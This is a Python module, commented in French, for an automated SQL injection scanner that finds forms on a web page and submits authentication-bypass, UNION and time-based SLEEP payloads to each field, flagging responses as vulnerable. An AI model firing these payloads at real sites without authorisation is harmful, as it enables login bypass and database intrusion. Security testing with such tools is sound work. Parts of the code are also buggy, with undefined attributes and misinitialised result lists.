from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
import time
import random
import re
from concurrent.futures import ThreadPoolExecutor
from  app.schemas.type_attaque_enum import TypeAttaque
from app.models.attaque import Attaque
from app.models.faille import Faille
from datetime import datetime





class SQLIScanner:
    def __init__(self):
        self.resultats = {
            'attaques':[Attaque],
            'faille' : [Faille|None],
        }
        self.session = requests.Session()        
        # Listes de payloads et de modèles d'erreurs SQL
        self.payloads = [
            "' OR '1'='1", 
            "' OR '1'='1'--", 
            "' UNION SELECT null, version()--", 
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", 
            "' OR IF(1=1, SLEEP(2), 0)--",
            "' OR 1=1 --",
            "1' OR '1' = '1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "'UNION user = 'admin' --"
        ]
        
        self.sql_error_patterns = [
            r"SQL syntax.*?MySQL", 
            r"Warning.*?mysql_", 
            r"MySQLSyntaxErrorException", 
            r"valid MySQL result",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"PostgreSQL.*?ERROR",
            r"sqlite",
            r"syntax error",
            r"Microsoft SQL Server",
            r"You have an error in your SQL syntax",
            r"SQLite3::query",
            r"mysqli_fetch_array",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"Division by zero",
            r"supplied argument is not a valid MySQL",
            r"Column count doesn't match value count at row",
            r"Duplicate column name",
            r"Unclosed quotation mark",
            r"PG::SyntaxError:",
            r"SQLSTATE\[\d+\]",
            r"PDOException",
            r"Access denied for user",
            r"Query failed",
            r"SQL error",
            r"Syntax error or access violation",
            r"Integrity constraint violation",
            r"Incorrect column specifier",
            r"Procedure or function .* expects parameter",
            r"Invalid SQL statement or JDBC escape"
        ]
        
        self.blind_sql_patterns = [
            "SLEEP", "BENCHMARK", "WAITFOR DELAY", "pg_sleep", 
            "DELAY", "DBMS_PIPE.RECEIVE_MESSAGE", "WAIT FOR", "WAIT FOR DELAY"
        ]

    def get_garbage_value(self, field_type, field_name):
        # Génération de valeurs aléatoires pour les champs non testés
        # Cette partie peut être améliorée avec plus de types et de valeurs
        if field_type == "email" or "email" in field_name:
            return random.choice(["test@gmail.com", "user@test.com"])
        elif field_type == "password" or "password" in field_name:
            return random.choice(["Password123!", "Test1234"])
        else:
            return random.choice(["test123", "testvalue"])

    def test_field(self, url, form_details, input_field, payload):
        # Création des données pour le test
        data = {}
        for field in form_details["inputs"]:
            if field["type"] not in ["submit", "button", "image"]:
                if field["name"] != input_field["name"]:
                    data[field["name"]] = self.get_garbage_value(field["type"], field["name"])
                else:
                    data[field["name"]] = payload
        
        # Gestion spéciale pour les formulaires de connexion
        if form_details["is_login_form"]:
            username_field = None
            password_field = None
            for field in form_details["inputs"]:
                if field["name"].lower() in ["username", "user", "email", "login"]:
                    username_field = field["name"]
                elif field["name"].lower() in ["password", "pass", "pwd", "motdepasse", "mot_de_passe"]:
                    password_field = field["name"]
            
            if username_field and password_field:
                if username_field != input_field["name"]:
                    data[username_field] = self.get_garbage_value("text", username_field)
                if password_field != input_field["name"]:
                    data[password_field] = self.get_garbage_value("password", password_field)
        
        try:
            # Réinitialisation des cookies
            self.session.cookies.clear()
            initial_cookies = self.session.cookies.get_dict()
            for key, value in initial_cookies.items():
                self.session.cookies.set(key, value)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            start_time = time.time()
            if form_details["method"] == "post":
                response = self.session.post(form_details["action"], data=data, timeout=10, headers=headers, allow_redirects=True)
            else:
                response = self.session.get(form_details["action"], params=data, timeout=10, headers=headers, allow_redirects=True)
            temps_reponse = time.time() - start_time
            
            faille = False
            vuln_description = ""
            
            # Détection des erreurs SQL classiques
            for pattern in self.sql_error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    faille = True
                    vuln_description = "Error-based SQLi"
                    break
            
            # Détection des attaques aveugles basées sur le temps
            if not faille:
                for pattern in self.blind_sql_patterns:
                    if pattern.lower() in payload.lower() and temps_reponse > 2:
                        faille = True
                        vuln_description = "Blind SQLi (time-based)"
                        break
            
            # Détection du bypass d'authentification pour les formulaires de connexion
            if not faille and form_details["is_login_form"]:
                # Vérification des redirections
                if response.url != form_details["action"]:
                    faille = True
                    vuln_description = "SQLi bypass authentication (redirection)"
                
                # Vérification des changements de contenu indiquant une connexion réussie
                elif len(response.text) != len(self.original_content):
                    faille = True
                    vuln_description = "SQLi bypass authentication (content change)"
                
                # Vérification des nouveaux cookies (session potentielle créée)
                elif len(self.session.cookies.get_dict()) > len(initial_cookies):
                    new_cookies = set(self.session.cookies.get_dict().keys()) - set(initial_cookies.keys())
                    faille = True
                    vuln_description = f"SQLi bypass authentication (new cookies: {', '.join(new_cookies)})"
            
            # Détection des attaques aveugles basées sur le contenu
            if not faille:
                if abs(len(response.text) - len(self.original_content)) > 100:
                    faille = True
                    vuln_description = "Blind SQLi (content-based)"
                
                # Vérification des changements structurels
                orig_soup = BeautifulSoup(self.original_content, 'html.parser')
                resp_soup = BeautifulSoup(response.text, 'html.parser')
                
                orig_tables = len(orig_soup.find_all('table'))
                resp_tables = len(resp_soup.find_all('table'))
                
                if orig_tables != resp_tables:
                    faille = True
                    vuln_description = "Blind SQLi (structure change)"
            

            attaque = Attaque(
                    payload=payload,
                    date_attaque=datetime.now(),
                    resultat=0, #par défaut
                    id_Type = 1,
                )
            
            IsFaille=None
            if faille:
                print(f"[VULNÉRABLE] {url} - Champ {input_field['name']} vulnérable ({vuln_description}) avec {payload}")
                attaque.resultat=1
                IsFaille=Faille(
                    gravite=self._determine_severity(vuln_description),
                    description=vuln_description,
                    balise=input_field["name"],
                )
                self.resultats['attaques'].append(attaque)
                self.resultats['faille'].append(IsFaille)
                return True

            self.resultats['attaques'].append(attaque)
            return False
        
        except Exception as e:
            print(f"[ERREUR] Test échoué sur {url} avec {payload}: {str(e)}")

    def _determine_severity(self, type_vuln):
        severity_map = {
            "Error-based SQLi": 8,
            "Blind SQLi (time-based)": 7,
            "SQLi bypass authentication (redirection)": 9,
            "SQLi bypass authentication (content change)": 9,
            "Blind SQLi (content-based)": 6,
            "Blind SQLi (structure change)": 7,
            "Default": 5
        }
        return severity_map.get(type_vuln, severity_map["Default"])

    def test_sqli(self, url, form_details):
        # Sauvegarde du contenu original pour comparaison
        self.original_content = requests.get(url).text
        
        for input_field in form_details["inputs"]:
            input_name = input_field["name"]
            input_type = input_field["type"]
            
            if input_type in ["submit", "button", "image", "file", "hidden"]:
                continue
            
            random.shuffle(self.payloads)
            for payload in self.payloads:
                if(self.test_field(url, form_details, input_field, payload)):
                    break
                

    def scanner(self, url):
        # Récupération des formulaires sur la page
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get("action", "")
            action_url = url if not action else urljoin(url, action)
            method = form.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                if input_name:
                    inputs.append({"name": input_name, "type": input_type})
            
            # Détection si c'est un formulaire de connexion
            is_login_form = False
            for input_field in inputs:
                if input_field["name"].lower() in ["username", "user", "email", "login"]:
                    is_login_form = True
                    break
            
            form_details = {
                "action": action_url,
                "method": method,
                "inputs": inputs,
                "is_login_form": is_login_form
            }
            
            if inputs:
                self.test_sqli(url, form_details)

    def detecter_connexion_reussie(self, response, original_content, original_status_code, original_headers):
        """Detect if the page content indicates a successful login"""
        # Check for success patterns that weren't in the original page
        for pattern in self.success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                if not re.search(pattern, original_content, re.IGNORECASE):
                    return True

        # Check if error messages disappeared
        login_failure_present_in_original = False
        for pattern in self.login_failure_patterns:
            if re.search(pattern, original_content, re.IGNORECASE):
                login_failure_present_in_original = True
                if not re.search(pattern, response.text, re.IGNORECASE):
                    return True

        # Check for significant content length changes
        if abs(len(response.text) - len(original_content)) > 500:
            return True

        # Check for status code changes
        if response.status_code != original_status_code and response.status_code == 200:
            return True

        # Check for new cookies or session tokens
        new_cookies = set(response.cookies.keys())
        old_cookies = set(original_headers.get('Set-Cookie', '').split(';'))
        if len(new_cookies - old_cookies) > 0:
            return True

        return False


    def run_sqli(self, url):
        self.scanner(url)
        return self.resultats
